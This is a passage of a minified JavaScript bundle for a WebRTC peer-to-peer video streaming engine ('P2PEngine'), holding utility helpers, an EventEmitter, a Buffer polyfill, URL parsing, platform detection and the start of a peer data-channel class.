!function(e, t) {
    "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? exports.P2PEngine = t() : e.P2PEngine = t()
}("undefined" != typeof self ? self : this, function() {
    return function(e) {
        function t(r) {
            if (n[r]) return n[r].exports;
            var i = n[r] = {
                i: r,
                l: !1,
                exports: {}
            };
            return e[r].call(i.exports, i, i.exports, t), i.l = !0, i.exports
        }
        var n = {};
        return t.m = e, t.c = n, t.d = function(e, n, r) {
            t.o(e, n) || Object.defineProperty(e, n, {
                configurable: !1,
                enumerable: !0,
                get: r
            })
        }, t.n = function(e) {
            var n = e && e.__esModule ? function() {
                return e.default
            } : function() {
                return e
            };
            return t.d(n, "a", n), n
        }, t.o = function(e, t) {
            return Object.prototype.hasOwnProperty.call(e, t)
        }, t.p = "", t(t.s = 21)
    }([function(e, t, n) {
        "use strict";

        function r() {
            return !0
        }

        function i(e) {
            var t = new RegExp("(^|&)" + e + "=([^&]*)(&|$)"),
                n = window.location.search.substr(1).match(t);
            return null != n && "" !== n[2] ? n[2].toString() : ""
        }

        function o(e, t, n) {
            var r = new RegExp("([?&])" + t + "=.*?(&|$)", "i"),
                i = -1 !== e.indexOf("?") ? "&" : "?";
            return e.match(r) ? e.replace(r, "$1" + t + "=" + n + "$2") : e + i + t + "=" + n
        }

        function s() {
            return Date.parse(new Date) / 1e3
        }

        function a(e, t) {
            return parseInt(Math.random() * (t - e + 1) + e, 10)
        }

        function u(e) {
            return 0 === e ? g : .33 * e + .67
        }

        function l(e) {
            var t = new XMLHttpRequest;
            return new Promise(function(n, r) {
                t.open("GET", e, !0), t.responseType = "arraybuffer", t.timeout = 3e3, t.onload = function(e) {
                    206 === t.status ? n() : r()
                }, t.onerror = function(e) {
                    r()
                }, t.ontimeout = function(e) {
                    r()
                }, t.setRequestHeader("Range", "bytes=0-0"), t.send()
            })
        }

        function c() {
            var e = navigator.language || navigator.userLanguage;
            return e = e.substr(0, 2), "zh" === e ? "cn" : "en"
        }

        function f(e) {
            e.then(function() {})
        }

        function d(e) {
            return new Promise(function(t) {
                return setTimeout(t, e)
            })
        }

        function h() {
            if ("undefined" == typeof window) return null;
            var e = {
                RTCPeerConnection: window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection,
                RTCSessionDescription: window.RTCSessionDescription || window.mozRTCSessionDescription || window.webkitRTCSessionDescription,
                RTCIceCandidate: window.RTCIceCandidate || window.mozRTCIceCandidate || window.webkitRTCIceCandidate
            };
            return e.RTCPeerConnection ? e : null
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        }), t.noop = r, t.getQueryParam = i, t.updateQueryStringParam = o, t.getCurrentTs = s, t.randomNum = a, t.calCheckPeersDelay = u, t.performRangeRequest = l, t.navLang = c, t.dontWaitFor = f, t.timeout = d, t.getBrowserRTC = h;
        var g = 3
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            console && console.warn && console.warn(e)
        }

        function i() {
            i.init.call(this)
        }

        function o(e) {
            if ("function" != typeof e) throw new TypeError('The "listener" argument must be of type Function. Received type ' + typeof e)
        }

        function s(e) {
            return void 0 === e._maxListeners ? i.defaultMaxListeners : e._maxListeners
        }

        function a(e, t, n, i) {
            var a, u, l;
            if (o(n), u = e._events, void 0 === u ? (u = e._events = Object.create(null), e._eventsCount = 0) : (void 0 !== u.newListener && (e.emit("newListener", t, n.listener ? n.listener : n), u = e._events), l = u[t]), void 0 === l) l = u[t] = n, ++e._eventsCount;
            else if ("function" == typeof l ? l = u[t] = i ? [n, l] : [l, n] : i ? l.unshift(n) : l.push(n), (a = s(e)) > 0 && l.length > a && !l.warned) {
                l.warned = !0;
                var c = new Error("Possible EventEmitter memory leak detected. " + l.length + " " + String(t) + " listeners added. Use emitter.setMaxListeners() to increase limit");
                c.name = "MaxListenersExceededWarning", c.emitter = e, c.type = t, c.count = l.length, r(c)
            }
            return e
        }

        function u() {
            if (!this.fired) return this.target.removeListener(this.type, this.wrapFn), this.fired = !0, 0 === arguments.length ? this.listener.call(this.target) : this.listener.apply(this.target, arguments)
        }

        function l(e, t, n) {
            var r = {
                    fired: !1,
                    wrapFn: void 0,
                    target: e,
                    type: t,
                    listener: n
                },
                i = u.bind(r);
            return i.listener = n, r.wrapFn = i, i
        }

        function c(e, t, n) {
            var r = e._events;
            if (void 0 === r) return [];
            var i = r[t];
            return void 0 === i ? [] : "function" == typeof i ? n ? [i.listener || i] : [i] : n ? g(i) : d(i, i.length)
        }

        function f(e) {
            var t = this._events;
            if (void 0 !== t) {
                var n = t[e];
                if ("function" == typeof n) return 1;
                if (void 0 !== n) return n.length
            }
            return 0
        }

        function d(e, t) {
            for (var n = new Array(t), r = 0; r < t; ++r) n[r] = e[r];
            return n
        }

        function h(e, t) {
            for (; t + 1 < e.length; t++) e[t] = e[t + 1];
            e.pop()
        }

        function g(e) {
            for (var t = new Array(e.length), n = 0; n < t.length; ++n) t[n] = e[n].listener || e[n];
            return t
        }

        function p(e, t) {
            return new Promise(function(n, r) {
                function i() {
                    void 0 !== o && e.removeListener("error", o), n([].slice.call(arguments))
                }
                var o;
                "error" !== t && (o = function(n) {
                    e.removeListener(t, i), r(n)
                }, e.once("error", o)), e.once(t, i)
            })
        }
        var v, y = "object" == typeof Reflect ? Reflect : null,
            b = y && "function" == typeof y.apply ? y.apply : function(e, t, n) {
                return Function.prototype.apply.call(e, t, n)
            };
        v = y && "function" == typeof y.ownKeys ? y.ownKeys : Object.getOwnPropertySymbols ? function(e) {
            return Object.getOwnPropertyNames(e).concat(Object.getOwnPropertySymbols(e))
        } : function(e) {
            return Object.getOwnPropertyNames(e)
        };
        var m = Number.isNaN || function(e) {
            return e !== e
        };
        e.exports = i, e.exports.once = p, i.EventEmitter = i, i.prototype._events = void 0, i.prototype._eventsCount = 0, i.prototype._maxListeners = void 0;
        var _ = 10;
        Object.defineProperty(i, "defaultMaxListeners", {
            enumerable: !0,
            get: function() {
                return _
            },
            set: function(e) {
                if ("number" != typeof e || e < 0 || m(e)) throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + e + ".");
                _ = e
            }
        }), i.init = function() {
            void 0 !== this._events && this._events !== Object.getPrototypeOf(this)._events || (this._events = Object.create(null), this._eventsCount = 0), this._maxListeners = this._maxListeners || void 0
        }, i.prototype.setMaxListeners = function(e) {
            if ("number" != typeof e || e < 0 || m(e)) throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + e + ".");
            return this._maxListeners = e, this
        }, i.prototype.getMaxListeners = function() {
            return s(this)
        }, i.prototype.emit = function(e) {
            for (var t = [], n = 1; n < arguments.length; n++) t.push(arguments[n]);
            var r = "error" === e,
                i = this._events;
            if (void 0 !== i) r = r && void 0 === i.error;
            else if (!r) return !1;
            if (r) {
                var o;
                if (t.length > 0 && (o = t[0]), o instanceof Error) throw o;
                var s = new Error("Unhandled error." + (o ? " (" + o.message + ")" : ""));
                throw s.context = o, s
            }
            var a = i[e];
            if (void 0 === a) return !1;
            if ("function" == typeof a) b(a, this, t);
            else
                for (var u = a.length, l = d(a, u), n = 0; n < u; ++n) b(l[n], this, t);
            return !0
        }, i.prototype.addListener = function(e, t) {
            return a(this, e, t, !1)
        }, i.prototype.on = i.prototype.addListener, i.prototype.prependListener = function(e, t) {
            return a(this, e, t, !0)
        }, i.prototype.once = function(e, t) {
            return o(t), this.on(e, l(this, e, t)), this
        }, i.prototype.prependOnceListener = function(e, t) {
            return o(t), this.prependListener(e, l(this, e, t)), this
        }, i.prototype.removeListener = function(e, t) {
            var n, r, i, s, a;
            if (o(t), void 0 === (r = this._events)) return this;
            if (void 0 === (n = r[e])) return this;
            if (n === t || n.listener === t) 0 == --this._eventsCount ? this._events = Object.create(null) : (delete r[e], r.removeListener && this.emit("removeListener", e, n.listener || t));
            else if ("function" != typeof n) {
                for (i = -1, s = n.length - 1; s >= 0; s--)
                    if (n[s] === t || n[s].listener === t) {
                        a = n[s].listener, i = s;
                        break
                    } if (i < 0) return this;
                0 === i ? n.shift() : h(n, i), 1 === n.length && (r[e] = n[0]), void 0 !== r.removeListener && this.emit("removeListener", e, a || t)
            }
            return this
        }, i.prototype.off = i.prototype.removeListener, i.prototype.removeAllListeners = function(e) {
            var t, n, r;
            if (void 0 === (n = this._events)) return this;
            if (void 0 === n.removeListener) return 0 === arguments.length ? (this._events = Object.create(null), this._eventsCount = 0) : void 0 !== n[e] && (0 == --this._eventsCount ? this._events = Object.create(null) : delete n[e]), this;
            if (0 === arguments.length) {
                var i, o = Object.keys(n);
                for (r = 0; r < o.length; ++r) "removeListener" !== (i = o[r]) && this.removeAllListeners(i);
                return this.removeAllListeners("removeListener"), this._events = Object.create(null), this._eventsCount = 0, this
            }
            if ("function" == typeof(t = n[e])) this.removeListener(e, t);
            else if (void 0 !== t)
                for (r = t.length - 1; r >= 0; r--) this.removeListener(e, t[r]);
            return this
        }, i.prototype.listeners = function(e) {
            return c(this, e, !0)
        }, i.prototype.rawListeners = function(e) {
            return c(this, e, !1)
        }, i.listenerCount = function(e, t) {
            return "function" == typeof e.listenerCount ? e.listenerCount(t) : f.call(e, t)
        }, i.prototype.listenerCount = f, i.prototype.eventNames = function() {
            return this._eventsCount > 0 ? v(this._events) : []
        }
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        }), t.EngineBase = t.utils = t.WebsocketClient = t.SegmentManager = t.Segment = t.PeerManager = t.BtScheduler = t.config = t.Tracker = t.getPeersThrottle = t.Buffer = t.Server = t.Events = t.Peer = void 0;
        var i = n(10),
            o = r(i),
            s = n(3),
            a = r(s),
            u = n(24),
            l = r(u),
            c = n(11),
            f = r(c),
            d = n(27),
            h = r(d),
            g = n(29),
            p = r(g),
            v = n(30),
            y = r(v),
            b = n(18),
            m = r(b),
            _ = n(14),
            P = r(_),
            w = n(32),
            S = r(w),
            C = n(16),
            E = r(C),
            k = n(4),
            T = r(k),
            O = n(33),
            I = r(O),
            D = n(7).Buffer;
        t.Peer = o.default, t.Events = a.default, t.Server = l.default, t.Buffer = D, t.getPeersThrottle = f.default, t.Tracker = h.default, t.config = p.default, t.BtScheduler = y.default, t.PeerManager = m.default, t.Segment = P.default, t.SegmentManager = S.default, t.WebsocketClient = E.default, t.utils = T.default, t.EngineBase = I.default
    }, function(e, t, n) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        }), t.default = {
            DC_SIGNAL: "SIGNAL",
            DC_OPEN: "OPEN",
            DC_REQUEST: "REQUEST",
            DC_PIECE_NOT_FOUND: "PIECE_NOT_FOUND",
            DC_PIECE_ABORT: "PIECE_ABORT",
            DC_CLOSE: "CLOSE",
            DC_RESPONSE: "RESPONSE",
            DC_ERROR: "ERROR",
            DC_PIECE: "PIECE",
            DC_TIMEOUT: "TIMEOUT",
            DC_PIECE_ACK: "PIECE_ACK",
            DC_METADATA: "METADATA",
            DC_PLAT_ANDROID: "ANDROID",
            DC_PLAT_IOS: "IOS",
            DC_PLAT_WEB: "WEB",
            DC_CHOKE: "CHOKE",
            DC_UNCHOKE: "UNCHOKE",
            DC_HAVE: "HAVE",
            DC_LOST: "LOST",
            DC_GET_PEERS: "GET_PEERS",
            DC_PEERS: "PEERS",
            DC_STATS: "STATS",
            DC_SUBSCRIBE: "SUBSCRIBE",
            DC_UNSUBSCRIBE: "UNSUBSCRIBE",
            DC_SUBSCRIBE_ACCEPT: "SUBSCRIBE_ACCEPT",
            DC_SUBSCRIBE_REJECT: "SUBSCRIBE_REJECT",
            DC_SUBSCRIBE_LEVEL: "SUBSCRIBE_LEVEL",
            DC_PEER_SIGNAL: "PEER_SIGNAL",
            DC_PLAYLIST: "PLAY_LIST",
            BM_LOST: "lost",
            BM_ADDED_SEG_: "BM_ADDED_SEG_",
            BM_ADDED_SN_: "BM_ADDED_SN_",
            BM_SEG_ADDED: "BM_SEG_ADDED",
            FRAG_CHANGED: "FRAG_CHANGED",
            FRAG_LOADED: "FRAG_LOADED",
            FRAG_LOADING: "FRAG_LOADING",
            RESTART_P2P: "RESTART_P2P",
            EXCEPTION: "exception"
        }, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        }), t.tools = t.queueMicrotask = t.platform = t.Logger = t.getPeersThrottle = t.errCode = t.Buffer = void 0;
        var i = n(7),
            o = r(i),
            s = n(17),
            a = r(s),
            u = n(11),
            l = r(u),
            c = n(19),
            f = r(c),
            d = n(8),
            h = r(d),
            g = n(13),
            p = r(g),
            v = n(0),
            y = r(v);
        t.Buffer = o.default, t.errCode = a.default, t.getPeersThrottle = l.default, t.Logger = f.default, t.platform = h.default, t.queueMicrotask = p.default, t.tools = y.default
    }, function(e, t, n) {
        "use strict";

        function r(e, t) {
            var n = a.default.parseURL(e),
                r = n.path.substring(n.path.lastIndexOf(".") + 1);
            return -1 !== t.indexOf(r)
        }

        function i() {
            var e = performance.now();
            return {
                trequest: e,
                tfirst: 0,
                tload: 0,
                aborted: !1,
                loaded: 0,
                retry: 0,
                total: 0,
                chunkCount: 0,
                bwEstimate: 0,
                loading: {
                    start: e,
                    first: 0,
                    end: 0
                },
                parsing: {
                    start: 0,
                    end: 0
                },
                buffering: {
                    start: 0,
                    first: 0,
                    end: 0
                }
            }
        }

        function o(e, t) {
            var n = void 0,
                r = void 0,
                i = void 0,
                o = void 0,
                s = void 0,
                a = performance.now();
            n = a - 300, r = a - 200, i = a, e.trequest = n, e.tfirst = r, e.tload = i, e.loading = {
                first: n,
                start: r,
                end: i
            }, o = s = t, e.loaded = o, e.total = s
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        }), t.isBlockType = r, t.createLoadStats = i, t.updateLoadStats = o;
        var s = n(6),
            a = function(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }(s)
    }, function(e, t, n) {
        ! function(t) {
            var n = /^((?:[a-zA-Z0-9+\-.]+:)?)(\/\/[^\/?#]*)?((?:[^\/?#]*\/)*[^;?#]*)?(;[^?#]*)?(\?[^#]*)?(#.*)?$/,
                r = /^([^\/?#]*)(.*)$/,
                i = /(?:\/|^)\.(?=\/)/g,
                o = /(?:\/|^)\.\.\/(?!\.\.\/)[^\/]*(?=\/)/g,
                s = {
                    buildAbsoluteURL: function(e, t, n) {
                        if (n = n || {}, e = e.trim(), !(t = t.trim())) {
                            if (!n.alwaysNormalize) return e;
                            var i = s.parseURL(e);
                            if (!i) throw new Error("Error trying to parse base URL.");
                            return i.path = s.normalizePath(i.path), s.buildURLFromParts(i)
                        }
                        var o = s.parseURL(t);
                        if (!o) throw new Error("Error trying to parse relative URL.");
                        if (o.scheme) return n.alwaysNormalize ? (o.path = s.normalizePath(o.path), s.buildURLFromParts(o)) : t;
                        var a = s.parseURL(e);
                        if (!a) throw new Error("Error trying to parse base URL.");
                        if (!a.netLoc && a.path && "/" !== a.path[0]) {
                            var u = r.exec(a.path);
                            a.netLoc = u[1], a.path = u[2]
                        }
                        a.netLoc && !a.path && (a.path = "/");
                        var l = {
                            scheme: a.scheme,
                            netLoc: o.netLoc,
                            path: null,
                            params: o.params,
                            query: o.query,
                            fragment: o.fragment
                        };
                        if (!o.netLoc && (l.netLoc = a.netLoc, "/" !== o.path[0]))
                            if (o.path) {
                                var c = a.path,
                                    f = c.substring(0, c.lastIndexOf("/") + 1) + o.path;
                                l.path = s.normalizePath(f)
                            } else l.path = a.path, o.params || (l.params = a.params, o.query || (l.query = a.query));
                        return null === l.path && (l.path = n.alwaysNormalize ? s.normalizePath(o.path) : o.path), s.buildURLFromParts(l)
                    },
                    parseURL: function(e) {
                        var t = n.exec(e);
                        return t ? {
                            scheme: t[1] || "",
                            netLoc: t[2] || "",
                            path: t[3] || "",
                            params: t[4] || "",
                            query: t[5] || "",
                            fragment: t[6] || ""
                        } : null
                    },
                    normalizePath: function(e) {
                        for (e = e.split("").reverse().join("").replace(i, ""); e.length !== (e = e.replace(o, "")).length;);
                        return e.split("").reverse().join("")
                    },
                    buildURLFromParts: function(e) {
                        return e.scheme + e.netLoc + e.path + e.params + e.query + e.fragment
                    }
                };
            e.exports = s
        }()
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            if (e > m) throw new RangeError('The value "' + e + '" is invalid for option "size"');
            var t = new Uint8Array(e);
            return t.__proto__ = i.prototype, t
        }

        function i(e, t, n) {
            if ("number" == typeof e) {
                if ("string" == typeof t) throw new TypeError('The "string" argument must be of type string. Received type number');
                return u(e)
            }
            return o(e, t, n)
        }

        function o(e, t, n) {
            if ("string" == typeof e) return l(e, t);
            if (ArrayBuffer.isView(e)) return c(e);
            if (null == e) throw TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + (void 0 === e ? "undefined" : b(e)));
            if (v(e, ArrayBuffer) || e && v(e.buffer, ArrayBuffer)) return f(e, t, n);
            if ("number" == typeof e) throw new TypeError('The "value" argument must not be of type number. Received type number');
            var r = e.valueOf && e.valueOf();
            if (null != r && r !== e) return i.from(r, t, n);
            var o = d(e);
            if (o) return o;
            if ("undefined" != typeof Symbol && null != Symbol.toPrimitive && "function" == typeof e[Symbol.toPrimitive]) return i.from(e[Symbol.toPrimitive]("string"), t, n);
            throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + (void 0 === e ? "undefined" : b(e)))
        }

        function s(e) {
            if ("number" != typeof e) throw new TypeError('"size" argument must be of type number');
            if (e < 0) throw new RangeError('The value "' + e + '" is invalid for option "size"')
        }

        function a(e, t, n) {
            return s(e), e <= 0 ? r(e) : void 0 !== t ? "string" == typeof n ? r(e).fill(t, n) : r(e).fill(t) : r(e)
        }

        function u(e) {
            return s(e), r(e < 0 ? 0 : 0 | h(e))
        }

        function l(e, t) {
            if ("string" == typeof t && "" !== t || (t = "utf8"), !i.isEncoding(t)) throw new TypeError("Unknown encoding: " + t);
            var n = 0 | g(e, t),
                o = r(n),
                s = o.write(e, t);
            return s !== n && (o = o.slice(0, s)), o
        }

        function c(e) {
            for (var t = e.length < 0 ? 0 : 0 | h(e.length), n = r(t), i = 0; i < t; i += 1) n[i] = 255 & e[i];
            return n
        }

        function f(e, t, n) {
            if (t < 0 || e.byteLength < t) throw new RangeError('"offset" is outside of buffer bounds');
            if (e.byteLength < t + (n || 0)) throw new RangeError('"length" is outside of buffer bounds');
            var r;
            return r = void 0 === t && void 0 === n ? new Uint8Array(e) : void 0 === n ? new Uint8Array(e, t) : new Uint8Array(e, t, n), r.__proto__ = i.prototype, r
        }

        function d(e) {
            if (i.isBuffer(e)) {
                var t = 0 | h(e.length),
                    n = r(t);
                return 0 === n.length ? n : (e.copy(n, 0, 0, t), n)
            }
            return void 0 !== e.length ? "number" != typeof e.length || y(e.length) ? r(0) : c(e) : "Buffer" === e.type && Array.isArray(e.data) ? c(e.data) : void 0
        }

        function h(e) {
            if (e >= m) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + m.toString(16) + " bytes");
            return 0 | e
        }

        function g(e, t) {
            if (i.isBuffer(e)) return e.length;
            if (ArrayBuffer.isView(e) || v(e, ArrayBuffer)) return e.byteLength;
            if ("string" != typeof e) throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + (void 0 === e ? "undefined" : b(e)));
            var n = e.length,
                r = arguments.length > 2 && !0 === arguments[2];
            if (!r && 0 === n) return 0;
            for (var o = !1;;) switch (t) {
                case "ascii":
                case "latin1":
                case "binary":
                    return n;
                case "utf8":
                case "utf-8":
                    return p(e).length;
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return 2 * n;
                case "hex":
                    return n >>> 1;
                default:
                    if (o) return r ? -1 : p(e).length;
                    t = ("" + t).toLowerCase(), o = !0
            }
        }

        function p(e, t) {
            t = t || 1 / 0;
            for (var n, r = e.length, i = null, o = [], s = 0; s < r; ++s) {
                if ((n = e.charCodeAt(s)) > 55295 && n < 57344) {
                    if (!i) {
                        if (n > 56319) {
                            (t -= 3) > -1 && o.push(239, 191, 189);
                            continue
                        }
                        if (s + 1 === r) {
                            (t -= 3) > -1 && o.push(239, 191, 189);
                            continue
                        }
                        i = n;
                        continue
                    }
                    if (n < 56320) {
                        (t -= 3) > -1 && o.push(239, 191, 189), i = n;
                        continue
                    }
                    n = 65536 + (i - 55296 << 10 | n - 56320)
                } else i && (t -= 3) > -1 && o.push(239, 191, 189);
                if (i = null, n < 128) {
                    if ((t -= 1) < 0) break;
                    o.push(n)
                } else if (n < 2048) {
                    if ((t -= 2) < 0) break;
                    o.push(n >> 6 | 192, 63 & n | 128)
                } else if (n < 65536) {
                    if ((t -= 3) < 0) break;
                    o.push(n >> 12 | 224, n >> 6 & 63 | 128, 63 & n | 128)
                } else {
                    if (!(n < 1114112)) throw new Error("Invalid code point");
                    if ((t -= 4) < 0) break;
                    o.push(n >> 18 | 240, n >> 12 & 63 | 128, n >> 6 & 63 | 128, 63 & n | 128)
                }
            }
            return o
        }

        function v(e, t) {
            return e instanceof t || null != e && null != e.constructor && null != e.constructor.name && e.constructor.name === t.name
        }

        function y(e) {
            return e !== e
        }
        var b = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        } : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        };
        t.Buffer = i;
        var m = 2147483647;
        t.kMaxLength = m, i.TYPED_ARRAY_SUPPORT = function() {
            try {
                var e = new Uint8Array(1);
                return e.__proto__ = {
                    __proto__: Uint8Array.prototype,
                    foo: function() {
                        return 42
                    }
                }, 42 === e.foo()
            } catch (e) {
                return !1
            }
        }(), i.TYPED_ARRAY_SUPPORT || "undefined" == typeof console || "function" != typeof console.error || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."), "undefined" != typeof Symbol && null != Symbol.species && i[Symbol.species] === i && Object.defineProperty(i, Symbol.species, {
            value: null,
            configurable: !0,
            enumerable: !1,
            writable: !1
        }), i.from = function(e, t, n) {
            return o(e, t, n)
        }, i.prototype.__proto__ = Uint8Array.prototype, i.__proto__ = Uint8Array, i.alloc = function(e, t, n) {
            return a(e, t, n)
        }, i.allocUnsafe = function(e) {
            return u(e)
        }, i.isBuffer = function(e) {
            return null != e && !0 === e._isBuffer && e !== i.prototype
        }, i.isEncoding = function(e) {
            switch (String(e).toLowerCase()) {
                case "hex":
                case "utf8":
                case "utf-8":
                case "ascii":
                case "latin1":
                case "binary":
                case "base64":
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return !0;
                default:
                    return !1
            }
        }, i.concat = function(e, t) {
            if (!Array.isArray(e)) throw new TypeError('"list" argument must be an Array of Buffers');
            if (0 === e.length) return i.alloc(0);
            var n;
            if (void 0 === t)
                for (t = 0, n = 0; n < e.length; ++n) t += e[n].length;
            var r = i.allocUnsafe(t),
                o = 0;
            for (n = 0; n < e.length; ++n) {
                var s = e[n];
                if (v(s, Uint8Array) && (s = i.from(s)), !i.isBuffer(s)) throw new TypeError('"list" argument must be an Array of Buffers');
                s.copy(r, o), o += s.length
            }
            return r
        }, i.byteLength = g, i.prototype._isBuffer = !0, i.prototype.copy = function(e, t, n, r) {
            if (!i.isBuffer(e)) throw new TypeError("argument should be a Buffer");
            if (n || (n = 0), r || 0 === r || (r = this.length), t >= e.length && (t = e.length), t || (t = 0), r > 0 && r < n && (r = n), r === n) return 0;
            if (0 === e.length || 0 === this.length) return 0;
            if (t < 0) throw new RangeError("targetStart out of bounds");
            if (n < 0 || n >= this.length) throw new RangeError("Index out of range");
            if (r < 0) throw new RangeError("sourceEnd out of bounds");
            r > this.length && (r = this.length), e.length - t < r - n && (r = e.length - t + n);
            var o = r - n;
            if (this === e && "function" == typeof Uint8Array.prototype.copyWithin) this.copyWithin(t, n, r);
            else if (this === e && n < t && t < r)
                for (var s = o - 1; s >= 0; --s) e[s + t] = this[s + n];
            else Uint8Array.prototype.set.call(e, this.subarray(n, r), t);
            return o
        }
    }, function(e, t, n) {
        "use strict";

        function r() {
            return navigator.userAgent.toLowerCase()
        }

        function i(e) {
            return "" + (new RegExp(e + "(\\d+((\\.|_)\\d+)*)").exec(r()) || [, 0])[1] || void 0
        }

        function o(e) {
            return parseFloat((e || "").replace(/\_/g, ".")) || 0
        }
        var s = {
                ANDROID_WEB: "android-web",
                IOS_WEB: "iOS-web",
                PC_NATIVE: "PC-native",
                PC_WEB: "PC-web"
            },
            a = {
                getNetType: function() {
                    var e = (new RegExp("nettype\\/(\\w*)").exec(r()) || [, ""])[1].toLowerCase();
                    if (!e && navigator.connection) {
                        switch (navigator.connection.type) {
                            case "ethernet":
                                e = "ethernet";
                                break;
                            case "cellular":
                                e = "cellular";
                                break;
                            default:
                                e = "wifi"
                        }
                    }
                    return e
                },
                getPlatform: function() {
                    return a.isAndroid() ? s.ANDROID_WEB : a.isIOS() ? s.IOS_WEB : a.isElectron() ? s.PC_NATIVE : s.PC_WEB
                },
                isX5: function() {
                    return this.isAndroid() && /\s(TBS|X5Core)\/[\w\.\-]+/i.test(r())
                },
                isPC: function() {
                    return !o(i("os ")) && !o(i("android[/ ]"))
                },
                isIOS: function() {
                    return o(i("os "))
                },
                isAndroid: function() {
                    return o(i("android[/ ]"))
                },
                isIOSSafari: function() {
                    return this.isIOS() && this.isSafari()
                },
                isElectron: function() {
                    return /electron/i.test(r())
                },
                isMobile: function() {
                    return a.isAndroid() || a.isIOS()
                },
                isSafari: function() {
                    return /^((?!chrome|android).)*safari/i.test(r())
                },
                isFirefox: function() {
                    return /firefox/i.test(r())
                },
                isChrome: function() {
                    return /chrome/i.test(r())
                },
                device: s,
                getBrowser: function() {
                    return a.isX5() ? "X5" : a.isChrome() ? "Chrome" : a.isFirefox() ? "Firefox" : a.isIOSSafari() ? "iOS-Safari" : a.isSafari() ? "Mac-Safari" : "Unknown"
                }
            };
        e.exports = a
    }, function(e, t, n) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var r = Object.assign || function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
                }
                return e
            },
            i = n(2);
        t.default = r({
            SCH_DCHAVE: "SCH_DCHAVE"
        }, i.Events), e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function o(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function s(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }

        function a(e, t, n, r) {
            var i = [];
            if (r) {
                for (var o = void 0, s = 0; s < n - 1; s++) o = e.slice(s * t, (s + 1) * t), i.push(o);
                o = e.slice(e.byteLength - r, e.byteLength), i.push(o)
            } else
                for (var a = void 0, u = 0; u < n; u++) a = e.slice(u * t, (u + 1) * t), i.push(a);
            return i
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var u = Object.assign || function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
                }
                return e
            },
            l = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            c = n(23),
            f = r(c),
            d = n(1),
            h = r(d),
            g = n(3),
            p = r(g),
            v = n(0),
            y = n(14),
            b = r(y),
            m = n(8),
            _ = r(m),
            P = n(7).Buffer,
            w = 64e3,
            S = function(e) {
                function t(e, n, r, s, a, l) {
                    var c = arguments.length > 6 && void 0 !== arguments[6] ? arguments[6] : {};
                    i(this, t);
                    var d = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    d.engine = e, d.channel = e.fetcher.channelId, d.logger = e.logger, d.config = a, d.isInitiator = s, d.options = c, d.typeExpected = l, d.remotePeerId = r, d.intermediator = c.intermediator || null, d.channelId = s ? n + "-" + r : r + "-" + n, d.platform = "unknown", d.mobile = !1, d.mobileWeb = !1, d.connected = !1, d.msgQueue = [], d.miss = 0, d.bufArr = [], d.packetSize = w, d.connTimeout = setTimeout(function() {
                        d.logger.warn("dc " + d.channelId + " connection timeout"), d.emit(p.default.DC_ERROR, !0)
                    }, 3e4), d.sendReqQueue = [], d.downloading = !1, d.uploading = !1, d.choked = !1, d.downloadListeners = [], d.pieceMsg = {}, d.timeSendRequest = 0, d.timeReceivePiece = 0, d.timeSendPiece = 0, d.weight = 0, d.peersConnected = 1, d.timeJoin = (0, v.getCurrentTs)(), d.continuousHits = 0, d.uploadSpeed = 0, d.gotPeers = !1;
                    var h = {};
                    if (d.options.stuns.length > 0) {
                        var g = [];
                        d.options.stuns.forEach(function(e) {
                            d.logger.info("use stun " + e), g.push(e)
                        }), h.iceServers = [{
                            urls: g
                        }]
                    }
